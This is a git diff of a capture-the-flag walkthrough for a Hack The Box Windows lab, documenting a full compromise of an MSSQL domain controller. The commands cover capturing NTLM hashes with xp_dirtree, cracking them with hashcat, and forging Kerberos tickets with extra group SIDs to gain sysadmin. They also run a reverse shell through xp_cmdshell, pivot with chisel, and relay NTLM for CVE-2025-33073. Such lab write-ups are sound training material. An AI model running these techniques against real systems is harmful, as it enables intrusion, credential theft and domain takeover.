@@ -1,33 +1,37 @@
+## Testing
+
+IP
 
 ```IP
 10.129.50.149
 ```
-
+Username
 ```User
 scott
 ```
+Password
 ```Password
 Sm230#C5NatH
 ```
 
 ----
 
-ports
+Port scan
 
 ```
 nmap -p- -n -Pn -vv --min-rate=5000 10.129.50.149 -oG network/nmap_ports.txt
 ```
 
-01
+![](screenshots/01_ports.png)
 
 
-service
+Services and versions scan
 
 ```
 nmap -p1433 -sCV -Pn --min-rate=5000 10.129.50.149 -oN network/nmap_service.txt
 ```
 
-02
+![](screenshots/02_service.png)
 
 
 Validate credentials
@@ -36,14 +40,18 @@ Validate credentials
 nxc mssql 10.129.50.149 -u 'scott' -p 'Sm230#C5NatH' --local-auth
 ```
 
-03
+![](screenshots/03_validate_mssql.png)
+
+Domain
 
 ```Domain
 signed.htb
 ```
+Hostname
 ```Hostname
 DC01
 ```
+OS
 ```OS
 Microsoft SQL Server 2022 16.00.1000.00
 ```
@@ -55,14 +63,14 @@ Access MSSQL
 impacket-mssqlclient 'scott:Sm230#C5NatH@signed.htb'
 ```
 
-04
+![](screenshots/04_access_mssql.png)
 
 
 ```
 enum_db
 ```
 
-05
+![](screenshots/05_enum_db.png)
 
 
 Capture hash
@@ -79,7 +87,7 @@ Call inexistent resource on local
 xp_dirtree \\10.10.14.132\something
 ```
 
-06
+![](screenshots/06_mssqlsvc_hash.png)
 
 Saved to file
 
@@ -89,7 +97,7 @@ Cracking
 hashcat -m 5600 signed.htb.mssqlsvc.hash rockyou.txt
 ```
 
-07
+![](screenshots/07_cracked.png)
 
 New creds
 
@@ -106,21 +114,21 @@ Access MSSQL
 impacket-mssqlclient signed/mssqlsvc:'purPLE9795!@'@10.129.50.149 -windows-auth
 ```
 
-08
+![](screenshots/08_mssqlsvc_access.png)
 
 ```
 enable_xp_cmdshell
 ```
 
-09
+![](screenshots/09_no_permission_cmdshell.png)
 
 ```
 enum_impersonate
 ```
 
-10
+![](screenshots/10_enum_impersonate.png)
 
-Cant be impersonated
+Tried but can't be impersonated
 
 Enumerating Domain Users
 
@@ -128,7 +136,7 @@ Enumerating Domain Users
 nxc mssql 10.129.50.149 -u 'mssqlsvc' -p 'purPLE9795!@' --rid-brute
 ```
 
-11
+![](screenshots/11_accounts_rid_bruted.png)
 
 ```
 cat intelligence/users.txt | awk '{print $6}' | tee intelligence/users.txt
@@ -152,7 +160,7 @@ admin_sid = SID(bytes.fromhex(raw_sid))
 admin_sid.formatCanonical()
 ```
 
-12
+![](screenshots/12_SID.png)
 
 `S-1-5-21-4088429403-1159899800-2753317549-500`
 
@@ -171,19 +179,19 @@ Convert password to NT hash
 echo -n 'purPLE9795!@' | iconv -t utf-16le | openssl md4 -provider legacy
 ```
 
-13
+![](screenshots/13_nthash.png)
 
 `ef699384c3285c54128a3ee1ddb1a0cc`
 
 Ready
 
-14
+![](screenshots/14_ticketgen.png)
 
 ```
 ./ticketgen.sh
 ```
 
-15
+![](screenshots/15_ticket_saved.png)
 
 Access MSSQL as administrator with ticket
 
@@ -191,7 +199,7 @@ Access MSSQL as administrator with ticket
 KRB5CCNAME=administrator.ccache impacket-mssqlclient -k -windows-auth dc01.signed.htb
 ```
 
-16
+![](screenshots/16_admin_mssql.png)
 
 Still guest
 
@@ -199,7 +207,7 @@ Still guest
 enum_logins
 ```
 
-17
+![](screenshots/17_IT_admin.png)
 
 Figure out what SID identifyer IT Group has
 
@@ -213,7 +221,7 @@ select SUSER_SID('signed\IT')
 
 Using same logic as before with IT SID
 
-18
+![](screenshots/18_IT_sid.png)
 
 `S-1-5-21-4088429403-1159899800-2753317549-1105`
 
@@ -221,7 +229,7 @@ IT = 1105
 
 Adding IT identifyer to groups in script to create new ticket
 
-19
+![](screenshots/19_ticket_add_IT.png)
 
 Access MSSQL with new ticket
 
@@ -229,7 +237,7 @@ Access MSSQL with new ticket
 KRB5CCNAME=administrator.ccache impacket-mssqlclient -k -windows-auth dc01.signed.htb
 ```
 
-20
+![](screenshots/20_dbo.png)
 
 Now connected as dbo (database owner), with sysadmin rights
 
@@ -239,19 +247,19 @@ Enable cmdshell
 enable_xp_cmdshell
 ```
 
-21
+![](screenshots/21_cmdshell_on.png)
 
 ```
 xp_cmdshell <cmd>
 ```
 
-22
+![](screenshots/22_rce_via_mssql.png)
 
 Prepare Reverse Shell
 
 Make www/ dir, copy Invoke-PowershellTcpOneLine.ps1, edit, rename shell.ps1
 
-23
+![](screenshots/23_edit_revshell.png)
 
 Make base64 cradle
 
@@ -284,7 +292,7 @@ Obtained the shell
 whoami; ipconfig; type user.txt
 ```
 
-24+
+![](screenshots/24+flag_user_proof.png)
 
 ----
 
@@ -302,7 +310,7 @@ On linux
 /opt/tools/chisel/chisel_linux server --reverse -p 9000 -socks5
 ```
 
-25
+![](screenshots/25_chisel_on.png)
 
 On windows shell, change directory to \programdata
 
@@ -310,7 +318,7 @@ On windows shell, change directory to \programdata
 .\chisel.exe client 10.10.14.132:9000 R:socks
 ```
 
-26
+![](screenshots/26_socks_on.png)
 
 Edit proxy config
 
@@ -326,7 +334,7 @@ socks5    127.0.0.1 1080
 
 Save
 
-27
+![](screenshots/27_proxy.conf.png)
 
 Set proxy chain
 
@@ -334,15 +342,16 @@ Set proxy chain
 proxychains nc -zv 10.129.50.149 445
 ```
 
-28
+![](screenshots/28_445_OK.png)
 
 
 CVE-2025-33073:
 https://www.synacktiv.com/sites/default/files/2025-06/x33fcon-reflective_relay-cve-2025-33073.pdf
 
-29
+![](screenshots/29_magic_string.png)
 
-Using krbrelayx https://github.com/dirkjanm/krbrelayx dnstool.py
+Using krbrelayx https://github.com/dirkjanm/krbrelayx dnstool.py.
+
 Clone, may need venv and install impacket. Not necessary for me on Kali.
 
 Deep explaination of the attack on DarkCorp machine resolution by IppSec: https://youtu.be/miOE_yYh1JY?si=zzoMxJDvVdCwcxTu
@@ -351,13 +360,13 @@ Deep explaination of the attack on DarkCorp machine resolution by IppSec: https:
 proxychains python3 dnstool.py -u 'SIGNED\MSSQLSVC' -p 'purPLE9795!@' -a add -r dc011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA -d 10.10.14.132 10.129.50.149
 ```
 
-30
+![](screenshots/30_dnstool_ok.png)
 
 Switch to root
 
 Make sure impacket ntlmrelayx version is >= 13
 
-31
+![](screenshots/31_version_ok.png)
 
 ```
 proxychains impacket-ntlmrelayx -t winrms://10.129.50.149 -smb2support
@@ -377,11 +386,10 @@ Even though the techniques/tools used are standard OffSec, this specific exploit
 
 A few concrete reasons: (according to Claude AI, model Opus 4.8)
 
-"
-- OSCP doesn't test recent CVEs / 0days. The exam is built around stable, well-documented, repeatable techniques. A June-2025 conference-disclosed CVE that Microsoft patched days later is exactly the kind of thing OffSec avoids — it's a moving target and unfair to examine on.
+
+- "OSCP doesn't test recent CVEs / 0days. The exam is built around stable, well-documented, repeatable techniques. A June-2025 conference-disclosed CVE that Microsoft patched days later is exactly the kind of thing OffSec avoids — it's a moving target and unfair to examine on.
 - It's patched. The exam environment reflects configurations that exist because of misconfiguration or by-design abuse, not a specific unpatched reflection bug.
-- It's genuinely advanced. Marshalled target-info structures, LSASS token reflection, reversing DLLs in IDA to find the primitive — that's OSEP/red-team-research territory, well above the "apply fundamental course learnings" bar OSCP sets.
-"
+- It's genuinely advanced. Marshalled target-info structures, LSASS token reflection, reversing DLLs in IDA to find the primitive — that's OSEP/red-team-research territory, well above the "apply fundamental course learnings" bar OSCP sets."
 
 ---
 
@@ -399,13 +407,13 @@ select SUSER_SID('mssqlsvc')
 
 `'0105000000000005150000005b7bb0f398aa2245ad4a1ca44f040000'`
 
-32
+![](screenshots/32_mssql_sid.png)
 
 mssqlsvc = 1103
 
 Edit ticketget.sh and run
 
-33
+![](screenshots/33_mssqlsvc_sid_ticketer.png)
 
 ```
 ./ticketgen.sh
@@ -425,7 +433,7 @@ Reading files directly from MSSQL shell
 select * FROM openrowset(BULK 'c:\users\administrator\desktop\root.txt', SINGLE_CLOB) as CONTENTS;
 ```
 
-34
+![](screenshots/34_root.txt_proof.png)
 
 Should also be able to read powershell history where a command leaks the administrator password 
 
@@ -435,7 +443,7 @@ select * FROM openrowset(BULK 'c:\users\administrator\appdata\roaming\microsoft\
 
 But Im getting errors
 
-35
+![](screenshots/35_cant_read_history.png)
 
 Anyways, the root.txt flag was obtained and thats the actual written goal.
 
